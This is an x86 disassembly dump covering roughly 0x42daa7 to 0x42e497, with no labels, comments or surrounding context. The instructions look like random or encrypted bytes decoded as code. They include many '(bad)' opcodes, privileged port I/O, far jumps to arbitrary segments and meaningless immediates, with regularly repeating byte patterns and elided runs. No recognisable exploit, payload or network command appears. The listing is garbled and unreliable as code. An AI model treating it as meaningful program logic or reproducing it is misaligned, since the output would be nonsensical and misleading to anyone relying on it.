  42daa7:	mov    esp,0xf8b7aafb
  42daac:	or     eax,0x66e91f05
  42dab1:	pop    ecx
  42dab2:	imul   edx,DWORD PTR [edx+0x32],0xc9b5695e
  42dab9:	sbb    bh,BYTE PTR [edx-0x40]
  42dabc:	lods   eax,DWORD PTR ds:[esi]
  42dabd:	jle    0x42da45
  42dabf:	std    
  42dac0:	dec    ecx
  42dac1:	ins    DWORD PTR es:[edi],dx
  42dac2:	idiv   DWORD PTR [edi]
  42dac4:	nop
  42dac5:	sub    BYTE PTR ds:[edx],0x28
  42dac9:	or     cl,BYTE PTR [esi+0x4774e2f2]
  42dacf:	lahf   
  42dad0:	jg     0x42dad2
  42dad2:	jmp    0xd1a35f06
  42dad7:	aas    
  42dad8:	pop    eax
  42dad9:	inc    edi
  42dada:	call   FWORD PTR [esp+edx*4]
  42dadd:	and    eax,0xc5f83bea
  42dae2:	sahf   
  42dae3:	loope  0x42dabc
  42dae5:	mov    ebx,esi
  42dae7:	xor    edi,DWORD PTR [ecx+0x18]
  42daea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42daeb:	mov    bl,0x40
  42daed:	call   0x9569:0x7645ae55
  42daf4:	stos   BYTE PTR es:[edi],al
  42daf5:	cmp    BYTE PTR [edx],cl
  42daf7:	ins    BYTE PTR es:[edi],dx
  42daf8:	sbb    al,0x50
  42dafa:	scas   eax,DWORD PTR es:[edi]
  42dafb:	or     eax,0xa26459d6
  42db00:	cmp    eax,0x46a115fc
  42db05:	shl    DWORD PTR [esi-0x2],cl
  42db08:	jae    0x42db0d
  42db0a:	(bad)  
  42db0b:	leave  
  42db0c:	inc    edi
  42db0d:	lods   al,BYTE PTR ds:[esi]
  42db0e:	addr16 dec esi
	...
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42dbe9
  42db81:	jl     0x42dbfa
  42db83:	popf   
  42db84:	sub    cl,ch
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    al,0x1
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	jno    0x42dbf7
  42db8e:	add    al,BYTE PTR [ebp+0x6610bc71]
  42db94:	xchg   edx,esi
  42db96:	mov    DWORD PTR [edi],esi
  42db98:	lahf   
  42db99:	dec    edx
  42db9a:	fwait
  42db9b:	and    eax,DWORD PTR [edx+0x27b9352a]
  42dba1:	lahf   
  42dba2:	arpl   WORD PTR [eax+0x6d],si
  42dba5:	push   ax
  42dba7:	pop    ebp
  42dba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dba9:	rcl    ecx,cl
  42dbab:	lock inc esp
  42dbad:	pusha  
  42dbae:	mov    edi,0xbcee99fb
  42dbb3:	ret    0xecff
  42dbb6:	mov    ds:0xb8c6d96c,al
  42dbbb:	pop    es
  42dbbc:	in     eax,dx
  42dbbd:	push   ebp
  42dbbe:	inc    esp
  42dbbf:	xchg   edx,eax
  42dbc0:	pop    eax
  42dbc1:	jge    0x42db69
  42dbc3:	cmc    
  42dbc4:	jg     0x42db78
  42dbc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dbc7:	rol    DWORD PTR fs:[ebx-0x4c27b8b0],1
  42dbce:	sbb    DWORD PTR [ebp+0x31],0x5572e7ba
  42dbd5:	int    0xaf
  42dbd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbd8:	push   esi
  42dbd9:	inc    esp
  42dbda:	add    eax,0x56489f51
  42dbdf:	je     0x42db8a
  42dbe1:	(bad)  
  42dbe2:	jecxz  0x42dc3c
  42dbe4:	aad    0xc8
  42dbe6:	cli    
  42dbe7:	shl    BYTE PTR [ebx+0x74972a30],cl
  42dbed:	xor    esp,DWORD PTR [edx+0x1bda2671]
  42dbf3:	inc    ecx
  42dbf4:	(bad)  
  42dbf5:	retf   0x739
  42dbf8:	rcr    DWORD PTR [esi+0x4d],0x14
  42dbfc:	sub    eax,0xc6ce82fe
  42dc01:	stos   DWORD PTR es:[edi],eax
  42dc02:	jnp    0x42dc28
  42dc04:	mov    ebp,0x471e5bbb
  42dc09:	jg     0x42dbd1
  42dc0b:	push   esp
  42dc0c:	push   cs
  42dc0d:	mov    eax,ds:0xc15d35c
  42dc12:	clc    
  42dc13:	repnz fs dec esi
  42dc16:	mov    BYTE PTR ds:0x3826bbee,dl
  42dc1c:	add    BYTE PTR [edx+0x27],cl
  42dc1f:	xor    DWORD PTR [edi-0x2e],edi
  42dc22:	hlt    
  42dc23:	mov    ebp,0xd465f818
  42dc28:	inc    edi
  42dc29:	lods   al,BYTE PTR cs:[esi]
  42dc2b:	and    dl,al
  42dc2d:	sub    eax,0xeab9afbb
  42dc32:	std    
  42dc33:	xchg   esp,eax
  42dc34:	ins    BYTE PTR es:[edi],dx
  42dc35:	rcr    BYTE PTR [edi],0x61
  42dc38:	loope  0x42dc7b
  42dc3a:	add    dl,BYTE PTR [ebp+0x7efbdf55]
  42dc40:	push   edx
  42dc41:	dec    edx
  42dc42:	in     al,dx
  42dc43:	dec    ebp
  42dc44:	fld    TBYTE PTR [eax-0x61c522a3]
  42dc4a:	lods   eax,DWORD PTR ds:[esi]
  42dc4b:	dec    esi
  42dc4c:	scas   eax,DWORD PTR es:[edi]
  42dc4d:	jns    0x42dbe1
  42dc4f:	or     BYTE PTR [esi-0x74],al
  42dc52:	dec    eax
  42dc53:	push   esi
  42dc54:	into   
  42dc55:	push   ebx
  42dc56:	and    eax,0xfbd4ab2c
  42dc5b:	push   esi
  42dc5c:	dec    edi
  42dc5d:	js     0x42dc65
  42dc5f:	xor    al,0xd
  42dc61:	ja     0x42dc03
  42dc63:	mov    al,ds:0x4ff0b2d9
  42dc68:	ins    BYTE PTR es:[edi],dx
  42dc69:	lea    esp,[esi+0x3d]
  42dc6c:	inc    edx
  42dc6d:	stos   BYTE PTR es:[edi],al
  42dc6e:	imul   edx,DWORD PTR [ecx+0x69],0xcb82b6fe
  42dc75:	fstp   TBYTE PTR [ecx-0x5a]
  42dc78:	jmp    0x96e:0x39155996
  42dc7f:	adc    ebp,DWORD PTR [esi]
  42dc81:	jg     0x42dc29
  42dc83:	call   0x6020:0xeefc3374
  42dc8a:	das    
  42dc8b:	js     0x42dcb1
  42dc8d:	out    dx,al
  42dc8e:	in     eax,dx
  42dc8f:	pop    edi
	...
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	aam    0xc6
  42dd02:	rcr    DWORD PTR [esp+ebp*1+0x40001ea],1
  42dd09:	add    DWORD PTR [eax],eax
  42dd0b:	add    BYTE PTR [ebx+edx*1+0x6c],al
  42dd0f:	push   esp
  42dd10:	add    eax,0xef630f6c
  42dd15:	mov    DWORD PTR ds:0x79418f36,esi
  42dd1b:	mov    eax,ds:0x37178dc7
  42dd20:	in     eax,dx
  42dd21:	pusha  
  42dd22:	iret   
  42dd23:	pop    esi
  42dd24:	mov    ecx,0x8041608e
  42dd29:	outs   dx,DWORD PTR ds:[esi]
  42dd2a:	sbb    al,bl
  42dd2c:	jmp    0x7aa5:0xaeffaf94
  42dd33:	mov    edx,0xfa764a47
  42dd38:	in     eax,0xe9
  42dd3a:	inc    ebp
  42dd3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd3c:	ds retf 0xc548
  42dd40:	rcr    BYTE PTR [esi+0x7],0xe5
  42dd44:	push   edi
  42dd45:	lods   eax,DWORD PTR ds:[esi]
  42dd46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd47:	jo     0x42dcf8
  42dd49:	or     ch,0xd8
  42dd4c:	add    ebp,DWORD PTR [edx]
  42dd4e:	mov    ah,0xc6
  42dd50:	rcl    DWORD PTR [edi+0x4],1
  42dd53:	fbstp  TBYTE PTR [eax+eax*4-0x4d3b948c]
  42dd5a:	fnsave [ebp-0x64]
  42dd5d:	xor    BYTE PTR [esi+0x58bcbe84],bh
  42dd63:	int3   
  42dd64:	daa    
  42dd65:	sub    al,0xa7
  42dd67:	jnp    0x42ddcc
  42dd69:	push   ds
  42dd6a:	int    0x14
  42dd6c:	push   0x2c
  42dd6e:	leave  
  42dd6f:	sar    DWORD PTR [edi-0x46],cl
  42dd72:	or     dh,cl
  42dd74:	push   ebx
  42dd75:	cmp    BYTE PTR [ebp+0x734eceb4],bl
  42dd7b:	mov    ecx,ebp
  42dd7d:	mov    ah,BYTE PTR [eax+0x2e58f043]
  42dd83:	pop    ebx
  42dd84:	adc    al,bh
  42dd86:	mov    ecx,0x9fff643f
  42dd8b:	sub    esi,ebp
  42dd8d:	cmp    ecx,DWORD PTR [eax]
  42dd8f:	add    DWORD PTR [eax-0x699143],ebp
  42dd95:	mov    dh,0x46
  42dd97:	js     0x42de0b
  42dd99:	test   eax,0xcadef4b5
  42dd9e:	in     al,0x41
  42dda0:	mov    cl,0xe
  42dda2:	fist   DWORD PTR [edx-0x2]
  42dda5:	ret    
  42dda6:	mov    al,0x3
  42dda8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dda9:	out    0x61,al
  42ddab:	iret   
  42ddac:	push   ebp
  42ddad:	sub    DWORD PTR [edx],edi
  42ddaf:	mov    ebp,0x770089f0
  42ddb4:	mov    gs,ebx
  42ddb6:	pusha  
  42ddb7:	jno    0x42de13
  42ddb9:	in     al,dx
  42ddba:	cmp    al,0xd
  42ddbc:	or     BYTE PTR [esi],ah
  42ddbe:	xchg   edx,eax
  42ddbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ddc0:	rol    BYTE PTR [eax-0x5f],1
  42ddc3:	xor    eax,0xa042ff68
  42ddc8:	jno    0x42de06
  42ddca:	shl    DWORD PTR [ebx+ebp*2-0x24022ee6],1
  42ddd1:	dec    esi
  42ddd2:	retf   
  42ddd3:	and    al,0xc6
  42ddd5:	jecxz  0x42ddb5
  42ddd7:	xchg   esi,eax
  42ddd8:	add    ebp,DWORD PTR [edi+ebx*8]
  42dddb:	pop    ebp
  42dddc:	bound  esp,QWORD PTR [ebx+0x77]
  42dddf:	adc    al,0x31
  42dde1:	adc    ecx,eax
  42dde3:	pop    esp
  42dde4:	fs add eax,ecx
  42dde7:	sub    al,ch
  42dde9:	gs rol dh,0x84
  42dded:	push   ebx
  42ddee:	xor    ah,dl
  42ddf0:	pop    ebx
  42ddf1:	aaa    
  42ddf2:	jecxz  0x42de3d
  42ddf4:	jmp    0x5f4d:0x5b7631ff
  42ddfb:	loope  0x42ddf0
  42ddfd:	xor    BYTE PTR [edx-0x30dfd83b],dh
  42de03:	sbb    eax,0x776d1ffb
  42de08:	jle    0x42de84
  42de0a:	add    al,0x62
  42de0c:	and    bh,BYTE PTR [edi+0x7cb8]
	...
  42de72:	add    BYTE PTR [eax],al
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	shl    BYTE PTR [esi-0x14cfe68b],0x1
  42de87:	add    BYTE PTR [ecx+eax*1],al
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	js     0x42dea8
  42de8e:	rcl    cl,cl
  42de90:	(bad)  
  42de92:	cwde   
  42de93:	retf   
  42de94:	daa    
  42de95:	imul   ebp,ebx,0x5f355fe4
  42de9b:	aas    
  42de9c:	adc    ch,BYTE PTR [ecx+0x172707c8]
  42dea2:	jg     0x42de64
  42dea4:	js     0x42dee7
  42dea6:	mov    eax,0x6ad43922
  42deab:	sub    DWORD PTR [ebp-0x52],esi
  42deae:	mov    ah,0xf9
  42deb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42deb1:	cwde   
  42deb2:	repnz int3 
  42deb4:	mov    ebx,0xed7d2d1c
  42deb9:	retf   0xb229
  42debc:	int    0x80
  42debe:	or     DWORD PTR [esi],esp
  42dec0:	scas   al,BYTE PTR es:[edi]
  42dec1:	mov    dl,dl
  42dec3:	in     al,dx
  42dec4:	jp     0x42def3
  42dec6:	jle    0x42de9e
  42dec8:	test   eax,0xad2cccf4
  42decd:	bound  ebp,QWORD PTR [esi-0x3a]
  42ded0:	mov    eax,0x8a4ee44c
  42ded6:	(bad)  
  42ded7:	aad    0xce
  42ded9:	out    0x75,al
  42dedb:	je     0x42de8a
  42dedd:	fstp   QWORD PTR [esi+0x78]
  42dee0:	(bad)
  42dee3:	mov    dh,0xbe
  42dee5:	test   eax,0xc8467e66
  42deea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42deeb:	adc    esp,DWORD PTR [esi+eiz*2]
  42deee:	ins    DWORD PTR es:[edi],dx
  42deef:	ins    DWORD PTR es:[edi],dx
  42def0:	pop    esp
  42def1:	mov    ch,0xca
  42def3:	rol    DWORD PTR ds:0xa2dc5ab,0xdf
  42defa:	and    ecx,DWORD PTR [edx-0x34]
  42defd:	aad    0x4a
  42deff:	rol    DWORD PTR [esi],1
  42df01:	lea    eax,[ebx-0x74]
  42df04:	pop    ebp
  42df05:	push   0xea77b992
  42df0a:	fnstenv [ebp+ebx*1+0x77ea910a]
  42df11:	push   edi
  42df12:	fstp   DWORD PTR ds:0x60c2b2f5
  42df18:	or     ecx,esp
  42df1a:	sbb    edi,DWORD PTR [esi]
  42df1c:	jbe    0x42deee
  42df1e:	(bad)  
  42df1f:	shl    dl,cl
  42df21:	ss enter 0x7da0,0x31
  42df26:	pop    ss
  42df27:	mov    ah,0x11
  42df29:	or     esp,DWORD PTR [ecx+0x298f6b57]
  42df2f:	arpl   ax,cx
  42df31:	fidivr DWORD PTR [edx]
  42df33:	and    al,0x87
  42df35:	lea    ebx,[edx]
  42df37:	pop    eax
  42df38:	addr16 mov dl,0xeb
  42df3b:	jns    0x42df4a
  42df3d:	loopne 0x42df7b
  42df3f:	sub    ebx,edx
  42df41:	or     eax,0x3f5402b4
  42df46:	test   DWORD PTR [ecx],0x5f9b45e1
  42df4c:	cmc    
  42df4d:	out    dx,eax
  42df4e:	mov    cl,0x90
  42df50:	jns    0x42def3
  42df52:	mov    esp,DWORD PTR [esi+eiz*2]
  42df55:	icebp  
  42df56:	(bad)  [ecx-0x78]
  42df59:	cmp    BYTE PTR [eax],0xe9
  42df5c:	pop    esp
  42df5d:	(bad)  
  42df5e:	sbb    DWORD PTR [ebx+0x79],ebx
  42df61:	lods   eax,DWORD PTR ds:[esi]
  42df62:	loope  0x42def2
  42df64:	adc    ecx,DWORD PTR [ecx]
  42df66:	or     BYTE PTR [edi+0x2e],cl
  42df69:	cmp    al,0x72
  42df6b:	mov    esp,0x42ceb9b3
  42df70:	mov    esi,0x7a4316ad
  42df75:	mov    al,0x4e
  42df77:	mov    edi,0xdff28f54
  42df7c:	jmp    0xa53a:0x863bea5f
  42df83:	or     dl,BYTE PTR [edx-0x2c]
  42df86:	pop    edx
  42df87:	stos   BYTE PTR es:[edi],al
  42df88:	and    BYTE PTR [ebx],dh
  42df8a:	shl    bl,1
  42df8c:	and    BYTE PTR ds:0x65d7,dh
	...
  42dff2:	add    BYTE PTR [eax],al
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x49]
  42e001:	out    dx,eax
  42e002:	mov    cl,0xf2
  42e004:	xor    al,0xec
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	mov    dh,0x53
  42e00e:	lock loop 0x42dfe9
  42e011:	stc    
  42e012:	inc    edx
  42e013:	push   edx
  42e014:	sub    BYTE PTR [ecx-0x479c5a23],cl
  42e01a:	add    eax,0xffd5c918
  42e01f:	inc    edi
  42e020:	lods   eax,DWORD PTR ds:[esi]
  42e021:	add    BYTE PTR [edx],cl
  42e023:	pop    ebp
  42e024:	xor    BYTE PTR [ebx],dl
  42e026:	add    DWORD PTR [edx],ebx
  42e028:	retf   
  42e029:	daa    
  42e02a:	push   ebp
  42e02b:	sbb    DWORD PTR [ebx-0x4325ccb3],edi
  42e031:	sbb    esi,esi
  42e033:	push   0x43
  42e035:	and    al,0x93
  42e037:	sbb    DWORD PTR [edx-0x492680ed],0x35c33ef1
  42e041:	push   ebx
  42e042:	cmc    
  42e043:	inc    ecx
  42e044:	inc    ecx
  42e045:	out    dx,al
  42e046:	push   ebp
  42e047:	and    eax,0x49b247d6
  42e04c:	push   ss
  42e04d:	das    
  42e04e:	test   DWORD PTR [edx+0x42cc6fa0],0x975bde4b
  42e058:	enter  0xa0fa,0xfa
  42e05c:	mov    dl,BYTE PTR [di]
  42e05f:	inc    esi
  42e060:	cmp    eax,0xe5acb90e
  42e065:	or     BYTE PTR [edi+0x36973e83],0x26
  42e06c:	jl     0x42e077
  42e06e:	dec    edx
  42e06f:	fnstsw WORD PTR [ecx+0x6c63f749]
  42e075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e076:	scas   al,BYTE PTR es:[edi]
  42e077:	inc    edx
  42e078:	xchg   ecx,eax
  42e079:	ret    0x9575
  42e07c:	sar    DWORD PTR [ecx],1
  42e07e:	mov    al,ds:0x2c3c7733
  42e083:	dec    esp
  42e084:	inc    edi
  42e085:	push   ds
  42e086:	xchg   DWORD PTR [edi],ebx
  42e088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e089:	xchg   edx,eax
  42e08a:	sbb    BYTE PTR [esi-0x65],0x44
  42e08e:	xchg   BYTE PTR [edi],bh
  42e090:	lods   eax,DWORD PTR ds:[esi]
  42e091:	xlat   BYTE PTR ds:[ebx]
  42e092:	mov    ebp,0xb6373b8e
  42e097:	cmp    eax,0x83dc5ce0
  42e09c:	xchg   ebp,eax
  42e09d:	in     eax,dx
  42e09e:	adc    eax,0xcaa3c715
  42e0a3:	(bad)  
  42e0a4:	dec    esi
  42e0a5:	rcr    DWORD PTR [edx+0x64],0x88
  42e0a9:	sahf   
  42e0aa:	pop    esi
  42e0ab:	lahf   
  42e0ac:	dec    ebx
  42e0ad:	hlt    
  42e0ae:	(bad)  
  42e0af:	and    al,0x90
  42e0b1:	test   al,0xf4
  42e0b3:	in     eax,0xbe
  42e0b5:	add    al,0xeb
  42e0b7:	or     ah,BYTE PTR [ebx-0x7a]
  42e0ba:	inc    esi
  42e0bb:	es in  eax,0x5e
  42e0be:	aas    
  42e0bf:	jmp    0x4706:0x26abd062
  42e0c6:	or     eax,0x35cbc3c8
  42e0cb:	pop    edx
  42e0cc:	int3   
  42e0cd:	add    dl,ah
  42e0cf:	jmp    0x42e0cd
  42e0d1:	in     al,0x5b
  42e0d3:	stos   DWORD PTR es:[edi],eax
  42e0d4:	mov    esi,0x4085b203
  42e0d9:	inc    eax
  42e0da:	data16 (bad) 
  42e0dc:	push   esp
  42e0dd:	fbld   TBYTE PTR [edx+eax*2-0x27]
  42e0e1:	fcom   DWORD PTR [edx]
  42e0e3:	out    0x52,al
  42e0e5:	jno    0x42e0b7
  42e0e7:	fadd   QWORD PTR [ebx-0x222b81c7]
  42e0ed:	fcomp  st(6)
  42e0ef:	ret    
  42e0f0:	jbe    0x42e119
  42e0f2:	dec    esi
  42e0f3:	push   es
  42e0f4:	ret    0xafcf
  42e0f7:	fmul   DWORD PTR [edx-0x1a149ccd]
  42e0fd:	inc    edi
  42e0fe:	test   eax,0x5eb4badc
  42e103:	add    eax,0x9da91c35
  42e108:	mov    esi,0xe99a8c32
  42e10d:	mov    WORD PTR [ebx],?
  42e10f:	call   0x0:0x0
	...
  42e172:	add    BYTE PTR [eax],al
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	mov    ah,BYTE PTR [ebp-0x66]
  42e183:	dec    ecx
  42e184:	cmp    ch,ch
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	add    eax,0xdbdbfa22
  42e191:	out    0x8a,eax
  42e193:	jge    0x42e20d
  42e195:	inc    ebx
  42e196:	xchg   edi,eax
  42e197:	push   es
  42e198:	iret   
  42e199:	rdmsr  
  42e19b:	lods   eax,DWORD PTR ds:[esi]
  42e19c:	ret    
  42e19d:	xlat   BYTE PTR ds:[ebx]
  42e19e:	push   cs
  42e19f:	sar    edi,cl
  42e1a1:	sub    eax,0xb701b01c
  42e1a6:	sub    bl,BYTE PTR [edi-0x41662e71]
  42e1ac:	leave  
  42e1ad:	push   ss
  42e1ae:	mov    ah,BYTE PTR [ebx]
  42e1b0:	ret    
  42e1b1:	mov    WORD PTR [ebx-0x16],?
  42e1b4:	out    dx,eax
  42e1b5:	xor    ebx,esi
  42e1b7:	mov    ebx,0xc62f8e7
  42e1bc:	push   esi
  42e1bd:	(bad)  
  42e1be:	cld    
  42e1bf:	add    DWORD PTR [edi-0x47f15d92],esp
  42e1c5:	fs jns 0x42e1cf
  42e1c8:	pop    eax
  42e1c9:	push   ebx
  42e1ca:	ret    0xa3d5
  42e1cd:	push   ebp
  42e1ce:	jecxz  0x42e192
  42e1d0:	inc    esp
  42e1d1:	dec    ebx
  42e1d2:	mov    BYTE PTR [ebx],dh
  42e1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1d5:	cmp    al,0x30
  42e1d7:	push   esi
  42e1d8:	dec    edx
  42e1d9:	dec    eax
  42e1da:	fsubr  DWORD PTR [ebp+0x3f]
  42e1dd:	mov    dh,BYTE PTR [edx-0x3645acf5]
  42e1e3:	cmp    eax,0x2de0c39c
  42e1e8:	mov    edx,0x9a9dba36
  42e1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1ee:	shl    BYTE PTR cs:[esi],1
  42e1f1:	adc    al,0xfb
  42e1f3:	aas    
  42e1f4:	xor    esi,DWORD PTR [edx+0x308f765d]
  42e1fa:	pop    esp
  42e1fb:	retf   
  42e1fc:	mov    ds:0x36174cd3,eax
  42e201:	mov    bh,0xf5
  42e203:	mov    eax,ds:0x6038abb2
  42e208:	cmp    eax,0x6988ba67
  42e20d:	xchg   edi,eax
  42e20e:	sub    BYTE PTR [eax-0x3291c364],0x55
  42e215:	mov    ebp,0xe7073d79
  42e21a:	es jle 0x42e1d9
  42e21d:	cmc    
  42e21e:	add    BYTE PTR ds:0xe302000d,0x1d
  42e225:	jae    0x42e24c
  42e227:	pop    esi
  42e228:	mov    bh,0xd9
  42e22a:	dec    edx
  42e22b:	aad    0x3d
  42e22d:	or     cl,BYTE PTR [ecx-0x20]
  42e230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e231:	inc    esi
  42e232:	adc    dh,BYTE PTR [edx+0x64]
  42e235:	push   es
  42e236:	outs   dx,BYTE PTR ds:[esi]
  42e237:	cmp    bl,BYTE PTR [esi]
  42e239:	inc    edx
  42e23a:	not    BYTE PTR [ecx]
  42e23c:	fisttp DWORD PTR [esi]
  42e23e:	jae    0x42e21f
  42e240:	outs   dx,DWORD PTR ds:[esi]
  42e241:	pop    esi
  42e242:	inc    ebp
  42e243:	fnsave [edx-0x5f]
  42e246:	sbb    ecx,DWORD PTR [edx+0x11]
  42e249:	push   esi
  42e24a:	cmc    
  42e24b:	cmp    eax,0x819c91d3
  42e250:	and    bl,bh
  42e252:	sub    al,0x20
  42e254:	add    al,0x9b
  42e256:	push   ebp
  42e257:	sub    BYTE PTR [edi+0x3bfbd800],bl
  42e25d:	mov    edi,edi
  42e25f:	add    al,0xda
  42e261:	out    0xcc,al
  42e263:	push   esi
  42e264:	gs sbb dl,0x12
  42e268:	jb     0x42e1fe
  42e26a:	shl    edi,0x46
  42e26d:	(bad)  
  42e26f:	cmp    DWORD PTR [edx+0x67e05fc7],esp
  42e275:	cld    
  42e276:	cdq    
  42e277:	pop    ds
  42e278:	adc    al,0xca
  42e27a:	call   0xb6a57172
  42e27f:	cmp    al,0xb1
  42e281:	sbb    eax,0xdb43b043
  42e286:	inc    ebx
  42e287:	sbb    eax,0x6d782862
  42e28c:	inc    edi
  42e28d:	sub    DWORD PTR [esi+0x3e],ebx
	...
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x199140
  42e301:	sub    ah,BYTE PTR [ecx-0x7b]
  42e304:	cmp    al,0xee
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	jl     0x42e2a3
  42e30e:	popa   
  42e30f:	imul   esp,DWORD PTR ds:0x5b0dac0,0x4a40b3e5
  42e319:	repz dec sp
  42e31c:	ja     0x42e310
  42e31e:	adc    ebx,esp
  42e320:	(bad)  
  42e321:	fsub   QWORD PTR [eax-0x7b]
  42e324:	in     eax,dx
  42e325:	cmp    cl,BYTE PTR [ebx]
  42e327:	xchg   esi,eax
  42e328:	daa    
  42e329:	mov    ah,0xcd
  42e32b:	mov    BYTE PTR [edx-0x7e],dl
  42e32e:	std    
  42e32f:	mov    ch,0xc9
  42e331:	xchg   DWORD PTR [ebp+0x11b19bce],esp
  42e337:	loope  0x42e2cc
  42e339:	push   ecx
  42e33a:	mov    dh,0x1d
  42e33c:	dec    esp
  42e33d:	xchg   edx,eax
  42e33e:	je     0x42e39c
  42e340:	xor    eax,DWORD PTR [edx]
  42e342:	mov    DWORD PTR [edx],0xc74af0d0
  42e348:	sub    DWORD PTR [edx],0x18
  42e34b:	jecxz  0x42e33a
  42e34d:	sti    
  42e34e:	sub    DWORD PTR es:[edx],esp
  42e351:	mov    ebx,0xe4231f5d
  42e356:	xor    BYTE PTR [esi+0x73],0x9b
  42e35a:	xchg   BYTE PTR [ecx-0x78],ah
  42e35d:	dec    edx
  42e35e:	inc    edx
  42e35f:	ret    
  42e360:	in     eax,0x10
  42e362:	stc    
  42e363:	test   DWORD PTR [ebp+0x11],eax
  42e366:	gs pop ebp
  42e368:	mov    DWORD PTR [edx+eax*2-0x4e06583d],0x22b441d8
  42e373:	loope  0x42e32b
  42e375:	add    BYTE PTR ds:0x5b3ac626,ch
  42e37b:	int    0xf2
  42e37d:	ins    DWORD PTR es:[edi],dx
  42e37e:	jle    0x42e37e
  42e380:	dec    eax
  42e381:	cwde   
  42e382:	dec    edi
  42e383:	(bad)  
  42e384:	jge    0x42e3da
  42e386:	pop    ecx
  42e387:	mov    ebx,0x7acef0a0
  42e38c:	xchg   BYTE PTR ds:0x360ae362,ah
  42e392:	in     al,dx
  42e393:	add    BYTE PTR [esi+0x3911ab5e],0x1b
  42e39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e39b:	dec    eax
  42e39c:	pop    es
  42e39d:	(bad)  
  42e39e:	imul   ebx,ecx,0x49b37d1
  42e3a4:	clc    
  42e3a5:	stos   DWORD PTR es:[edi],eax
  42e3a6:	mov    dl,0x2b
  42e3a8:	adc    al,0xb7
  42e3aa:	rcl    DWORD PTR [eax],1
  42e3ac:	cdq    
  42e3ad:	push   esi
  42e3ae:	mov    al,ds:0x24fbe9e6
  42e3b3:	and    bl,ah
  42e3b5:	test   ah,bh
  42e3b7:	add    al,0x93
  42e3b9:	mov    ah,BYTE PTR [ebx-0x3919632f]
  42e3bf:	cmc    
  42e3c0:	cmp    dl,BYTE PTR [esp+ebp*1+0xd7f5029]
  42e3c7:	add    eax,eax
  42e3c9:	loop   0x42e3b8
  42e3cb:	push   esi
  42e3cc:	pop    ss
  42e3cd:	shl    DWORD PTR [eax+esi*2],cl
  42e3d0:	jl     0x42e3c8
  42e3d2:	push   edx
  42e3d3:	xchg   esi,eax
  42e3d4:	xchg   ebp,eax
  42e3d5:	not    ebx
  42e3d7:	lods   eax,DWORD PTR ds:[esi]
  42e3d8:	xor    eax,0xea329983
  42e3dd:	add    ebx,DWORD PTR [eax-0x28c3119c]
  42e3e3:	imul   edx,DWORD PTR [ecx],0x32532f1
  42e3e9:	cmc    
  42e3ea:	mov    ds:0xe5c5ced3,eax
  42e3ef:	sbb    eax,0xe6eacb0c
  42e3f4:	loopne 0x42e3d0
  42e3f6:	and    eax,0xec49814b
  42e3fb:	and    dl,BYTE PTR [ebx+esi*8+0x11edabeb]
  42e402:	aam    0xd8
  42e404:	sbb    edx,DWORD PTR [ecx+esi*4]
  42e407:	(bad)  
  42e408:	stc    
  42e409:	or     al,BYTE PTR [eax]
  42e40b:	mov    DWORD PTR ds:0xa2526a,ebp
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	dec    ecx
  42e481:	or     BYTE PTR [edi+0x4c],bh
  42e484:	inc    eax
  42e485:	out    dx,eax
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    al,0x1
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	shr    BYTE PTR [esi-0x64],cl
  42e48f:	push   ecx
  42e490:	mov    BYTE PTR [eax+eax*4],bl
  42e493:	es jp  0x42e4c1
  42e496:	outs   dx,DWORD PTR ds:[esi]
  42e497:	js     0x42e493
